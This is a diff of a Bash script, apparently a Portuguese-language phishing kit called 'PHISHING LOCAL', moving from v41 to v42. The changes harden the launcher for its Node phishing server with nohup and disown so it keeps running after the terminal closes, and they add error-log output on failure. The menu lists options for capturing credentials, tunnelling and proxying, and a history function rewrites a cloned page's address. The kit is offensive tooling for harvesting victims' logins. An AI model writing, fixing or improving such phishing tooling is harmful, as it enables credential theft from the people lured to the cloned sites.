@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISHING LOCAL v41 - Clonador Profissional
+# 🎣 PHISHING LOCAL v42 - Clonador Profissional
 # 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Localhost 6 Link 7 Status 8 Parar 9 Proxy 0 Sair
 # ============================================
 
@@ -370,8 +370,9 @@ ENDSPA
     sleep 1
 
     local my_ip=$(get_my_ip)
-    REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
+    REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
     local pid=$!
+    disown "$pid" 2>/dev/null
     echo "$pid" > "$SCRIPT_DIR/.server.pid"
     sleep 3
 
@@ -379,18 +380,18 @@ ENDSPA
         echo -e "${GREEN}[OK] Servidor rodando! PID: $pid${NC}"
         echo -e "${GREEN}[OK] http://${my_ip}:${port}${NC}"
     else
-        local err
-        err=$(grep -i "error\|cannot\|denied" "$SCRIPT_DIR/server.log" 2>/dev/null | tail -1)
-        echo -e "${RED}[ERRO] Servidor nao subiu${NC}"
-        [ -n "$err" ] && echo -e "  ${RED}$err${NC}"
+        echo -e "${RED}[ERRO] Servidor nao subiu (ou caiu)${NC}"
         echo -e "  ${WHITE}Log: $SCRIPT_DIR/server.log${NC}"
+        echo -e "  ${WHITE}---${NC}"
+        tail -5 "$SCRIPT_DIR/server.log" 2>/dev/null | while read l; do echo -e "  ${RED}$l${NC}"; done
+        echo -e "  ${WHITE}---${NC}"
         rm -f "$SCRIPT_DIR/.server.pid"
         echo -n "  Tentar de novo? (s/n): "
         read RETRY
         if echo "$RETRY" | grep -qi "^s"; then
             pkill -9 -f "node.*server.js" 2>/dev/null; sleep 2
-            REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
-            pid=$!; echo "$pid" > "$SCRIPT_DIR/.server.pid"; sleep 3
+            REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
+            pid=$!; disown "$pid" 2>/dev/null; echo "$pid" > "$SCRIPT_DIR/.server.pid"; sleep 3
             if kill -0 "$pid" 2>/dev/null; then
                 echo -e "${GREEN}[OK] http://${my_ip}:${port}${NC}"
             else
@@ -579,7 +580,8 @@ show_history() {
             perl -i -pe "s|http://[0-9.]+:[0-9]+|http://${my_ip}:${p}|g" "$SITE_DIR/index.html"
             cd "$SCRIPT_DIR"
             REDIRECT_URL="$r" PORT="$p" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
-            echo "$!" > "$SCRIPT_DIR/.server.pid"
+            srv_pid=$!; disown "$srv_pid" 2>/dev/null
+            echo "$srv_pid" > "$SCRIPT_DIR/.server.pid"
             echo -e "${GREEN}[OK] http://${my_ip}:${p}${NC}"
         elif [ "$ACT" = "2" ]; then
             clone_site "$u" "$r" "$p"
@@ -807,7 +809,7 @@ while true; do
     echo -e "  ██║     ██║  ██║██║███████║██║  ██║"
     echo -e "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
     echo ""
-    echo -e "  🎣 PHISHING LOCAL ${CYAN}v41${NC}"
+    echo -e "  🎣 PHISHING LOCAL ${CYAN}v42${NC}"
     echo ""
     echo "  ─────────────────────────────────────────"
     echo ""
